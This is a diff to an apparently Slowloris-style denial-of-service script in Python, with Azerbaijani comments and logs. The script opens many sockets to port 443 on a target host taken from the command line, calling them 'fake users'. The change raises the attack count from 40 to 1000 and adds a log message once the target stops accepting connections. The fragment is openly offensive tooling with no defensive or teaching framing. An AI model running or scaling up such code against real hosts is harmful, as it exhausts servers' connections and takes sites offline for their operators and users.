@@ -19,7 +19,7 @@ HTTPHeaders = [
     # en-US,en;q=0.5
 ]
 hostName = sys.argv[1]
-attackCount = 40 # buradan hucum sayini artirin.
+attackCount = 1000 # buradan hucum sayini artirin.
 log("{} saytina {} eded fake user gonderilir.".format(hostName, attackCount))
 for i in range(1,attackCount+1):
     try:
@@ -28,6 +28,7 @@ for i in range(1,attackCount+1):
         s.settimeout(4)
         s.connect((hostName, 443))
     except socket.error:
+        log("{} user yeterlidir :)".format(i))
         break
     socketList.append(s)
 log("{} saytina ugurla {} eded fake user gonderildi.".format(hostName, i))
